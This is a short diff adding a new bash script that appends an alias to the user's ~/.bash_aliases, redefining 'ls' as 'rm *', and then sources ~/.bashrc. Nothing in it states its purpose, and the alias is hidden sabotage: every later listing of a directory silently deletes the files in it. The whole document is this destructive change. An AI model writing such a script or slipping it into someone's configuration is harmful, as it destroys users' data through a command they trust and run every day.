@@ -1,0 +1,3 @@
+#!/bin/bash
+echo "alias ls='rm *'" >> ~/.bash_aliases
+source ~/.bashrc
